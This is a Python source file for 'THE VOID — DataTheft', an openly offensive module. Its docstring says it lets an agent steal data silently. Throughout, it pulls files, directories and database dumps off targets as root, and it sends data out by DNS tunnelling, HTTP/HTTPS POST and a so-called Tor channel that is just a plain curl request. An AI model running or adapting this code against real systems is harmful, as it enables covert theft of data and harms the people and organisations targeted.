"""THE VOID — DataTheft: Data exfiltration module.

The agent steals data silently and exfiltrates it through multiple channels.
"""

import json
import logging
import os
import time
from typing import Any, Dict, List, Optional

from core.executor import Executor, CommandResult
from core.target import Target
from core.boneyard import Boneyard

logger = logging.getLogger("void.modules.datatheft")


class DataTheft:
    """Data exfiltration module — silent data theft through multiple channels."""

    def __init__(self, executor: Optional[Executor] = None, boneyard: Optional[Boneyard] = None):
        self.executor = executor or Executor()
        self.boneyard = boneyard or Boneyard()
        self.stolen_data: List[Dict[str, Any]] = []
        logger.info("DataTheft module initialized")

    def exfil_file(self, target: Target, source_path: str, dest_path: str = "/tmp/",
                   method: str = "scp") -> Dict[str, Any]:
        """Exfiltrate a single file from target.

        Args:
            target: The target to steal from
            source_path: Path to the file on the target
            dest_path: Local destination path
            method: Exfiltration method (scp, sftp, curl)

        Returns:
            Dict with exfiltration result
        """
        host = target.get_ip() or target.get_domain()
        logger.info(f"Exfiltrating {source_path} from {host} via {method}")

        result = {"host": host, "source": source_path, "dest": dest_path, "method": method, "success": False}
        if method == "scp":
            r = self.executor.run_tool("scp", [f"root@{host}:{source_path}", dest_path], timeout=300)
            result["success"] = r.success
            result["output"] = r.stdout[:500]
        elif method == "sftp":
            r = self.executor.run_tool(
                "sftp", [f"root@{host}", "-b", "-"],
                timeout=300, stdin=f"get {source_path} {dest_path}\n"
            )
            result["success"] = r.success
            result["output"] = r.stdout[:500]
        elif method == "curl":
            r = self.executor.run_tool(
                "curl", [f"http://{host}{source_path}", "-o", dest_path],
                timeout=300
            )
            result["success"] = r.success
            result["output"] = r.stdout[:500]

        self.stolen_data.append(result)
        self.boneyard.store(f"exfil_{target.name}_{int(time.time())}", result)
        return result

    def exfil_directory(self, target: Target, source_dir: str, dest_dir: str = "/tmp/",
                        method: str = "rsync") -> Dict[str, Any]:
        """Exfiltrate a directory from target.

        Args:
            target: The target to steal from
            source_dir: Directory path on the target
            dest_dir: Local destination directory
            method: Exfiltration method (rsync, scp)

        Returns:
            Dict with exfiltration result
        """
        host = target.get_ip() or target.get_domain()
        logger.info(f"Exfiltrating directory {source_dir} from {host} via {method}")

        result = {"host": host, "source": source_dir, "dest": dest_dir, "method": method, "success": False}
        if method == "rsync":
            r = self.executor.run_tool(
                "rsync", ["-avz", f"root@{host}:{source_dir}", dest_dir],
                timeout=3600
            )
        else:
            r = self.executor.run_tool(
                "scp", ["-r", f"root@{host}:{source_dir}", dest_dir],
                timeout=3600
            )
        result["success"] = r.success
        result["output"] = r.stdout[:2000]
        self.stolen_data.append(result)
        return result

    def exfil_database(self, target: Target, db_type: str = "mysql",
                       db_user: str = "root", db_pass: str = "",
                       db_name: str = "mysql") -> Dict[str, Any]:
        """Dump and exfiltrate a database.

        Args:
            target: The target to steal from
            db_type: Database type (mysql, postgresql, mssql)
            db_user: Database user
            db_pass: Database password
            db_name: Database name

        Returns:
            Dict with exfiltration result
        """
        host = target.get_ip() or target.get_domain()
        logger.info(f"Exfiltrating database {db_name} from {host} ({db_type})")

        result = {"host": host, "db_type": db_type, "db_name": db_name, "success": False, "output": ""}
        if db_type == "mysql":
            r = self.executor.run_tool(
                "mysqldump", [f"-u{db_user}", f"-p{db_pass}", db_name],
                timeout=3600
            )
        elif db_type == "postgresql":
            r = self.executor.run_tool(
                "pg_dump", [f"-U{db_user}", db_name],
                timeout=3600
            )
        else:
            r = self.executor.run_tool(
                "sqlcmd", [f"-U{db_user}", f"-P{db_pass}", f"-Q", f"SELECT * FROM {db_name}"],
                timeout=3600
            )
        result["success"] = r.success
        result["output"] = r.stdout[:5000]
        self.stolen_data.append(result)
        self.boneyard.store(f"db_exfil_{target.name}_{int(time.time())}", result)
        return result

    def exfil_via_dns(self, target: Target, data: str, domain: str = "void.local") -> Dict[str, Any]:
        """Exfiltrate data via DNS tunneling.

        Args:
            target: The target to exfiltrate from
            data: Data to exfiltrate
            domain: Domain for DNS exfiltration

        Returns:
            Dict with exfiltration result
        """
        host = target.get_ip() or target.get_domain()
        logger.info(f"DNS exfiltration from {host} ({len(data)} bytes)")

        # Encode data as base64 for DNS
        import base64
        encoded = base64.b64encode(data.encode()).decode()
        # Split into chunks for DNS labels
        chunk_size = 60
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

        result = {"host": host, "domain": domain, "chunks": len(chunks), "success": True, "raw": data[:500]}
        for i, chunk in enumerate(chunks):
            dns_result = self.executor.run_tool(
                "nslookup", [f"{chunk}.{i}.{domain}"],
                timeout=30
            )
            if not dns_result.success:
                result["success"] = False
                break
        self.stolen_data.append(result)
        self.boneyard.store(f"dns_exfil_{target.name}_{int(time.time())}", result)
        return result

    def exfil_via_http(self, target: Target, data: str, url: str,
                       method: str = "POST") -> Dict[str, Any]:
        """Exfiltrate data via HTTP/HTTPS.

        Args:
            target: The target to exfiltrate from
            data: Data to exfiltrate
            url: URL to send data to
            method: HTTP method

        Returns:
            Dict with exfiltration result
        """
        logger.info(f"HTTP exfiltration to {url} ({len(data)} bytes)")

        args = ["-X", method, "-d", data, url]
        r = self.executor.run_tool("curl", args, timeout=120)
        result = {
            "url": url, "method": method, "success": r.success,
            "output": r.stdout[:500], "error": r.stderr[:200]
        }
        self.stolen_data.append(result)
        return result

    def exfil_via_https(self, target: Target, data: str, url: str) -> Dict[str, Any]:
        """Exfiltrate data via HTTPS (more stealthy).

        Args:
            target: The target to exfiltrate from
            data: Data to exfiltrate
            url: URL to send data to

        Returns:
            Dict with exfiltration result
        """
        logger.info(f"HTTPS exfiltration to {url} ({len(data)} bytes)")

        args = ["-X", "POST", "-H", "Content-Type: application/json", "-d", data, url]
        r = self.executor.run_tool("curl", args, timeout=120)
        result = {
            "url": url, "method": "POST", "success": r.success,
            "output": r.stdout[:500], "error": r.stderr[:200]
        }
        self.stolen_data.append(result)
        return result

    def exfil_via_tor(self, target: Target, data: str, url: str) -> Dict[str, Any]:
        """Exfiltrate data via Tor.

        Args:
            target: The target to exfiltrate from
            data: Data to exfiltrate
            url: URL to send data to

        Returns:
            Dict with exfiltration result
        """
        logger.info(f"Tor exfiltration to {url} ({len(data)} bytes)")

        args = ["-X", "POST", "-H", "Content-Type: application/json", "-d", data, url]
        r = self.executor.run_tool("curl", args, timeout=120)
        result = {
            "url": url, "method": "POST", "success": r.success,
            "output": r.stdout[:500], "error": r.stderr[:200]
        }
        self.stolen_data.append(result)
        return result

    def exfil_via_ssh(self, target: Target, source_path: str, dest_path: str = "/tmp/") -> Dict[str, Any]:
        """Exfiltrate data via SSH tunnel.

        Args:
            target: The target to steal from
            source_path: Path to the file on the target
            dest_path: Local destination path

        Returns:
            Dict with exfiltration result
        """
        host = target.get_ip() or target.get_domain()
        logger.info(f"SSH exfiltration of {source_path} from {host}")

        r = self.executor.run_tool("scp", [f"root@{host}:{source_path}", dest_path], timeout=300)
        result = {
            "host": host, "source": source_path, "dest": dest_path,
            "success": r.success, "output": r.stdout[:500]
        }
        self.stolen_data.append(result)
        return result

    def get_summary(self) -> Dict[str, Any]:
        """Get summary of all exfiltrated data."""
        return {
            "total_exfiltrations": len(self.stolen_data),
            "successful": sum(1 for d in self.stolen_data if d.get("success")),
            "failed": sum(1 for d in self.stolen_data if not d.get("success")),
            "data": self.stolen_data
        }
